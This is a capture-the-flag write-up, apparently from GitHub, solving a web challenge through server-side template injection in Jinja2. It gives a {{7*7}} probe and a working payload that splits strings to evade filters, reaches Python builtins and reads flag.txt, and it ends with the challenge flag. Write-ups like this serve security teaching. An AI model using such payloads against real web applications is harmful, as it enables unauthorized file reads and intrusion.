<img width="928" height="522" alt="image" src="https://github.com/user-attachments/assets/b23931e3-d7e2-443a-8a74-e6d15b5d7902" />

# Challenge 

We are presented with a web application that reflects our input back into the page. This hints at a possible **Server-Side Template Injection (SSTI)** vulnerability.

<img width="797" height="420" alt="image" src="https://github.com/user-attachments/assets/c4caf974-6189-4f90-89ad-5d760c618e53" />

## Solution

1. **Testing for SSTI**
   - Submitting `{{7*7}}` returns `49`.
   - This confirms template injection is possible (likely Jinja2).
  
<img width="940" height="511" alt="image" src="https://github.com/user-attachments/assets/169b58e4-73a3-4c0d-931b-57a23013e160" />

  
2. **Getting the Flag**
   - Instead of overcomplicating things, I simply guessed that the flag would be in `flag.txt`.  
   - Using SSTI to read it:
     ```jinja2
     {{ cycler.__init__.__globals__['__bui'~'ltins__']['o'~'pen']('fl'~'ag'~'.t'~'xt')['re'~'ad']() }}
     ```
   - This successfully revealed the flag.
  
  <img width="940" height="618" alt="image" src="https://github.com/user-attachments/assets/3cc0edc8-0b26-430b-81a2-c7ebbc510eba" />

  
## Flag 

```
n3xt{sst1_m4k3_4_p3rf3ct_ch4ll3ng3}
```
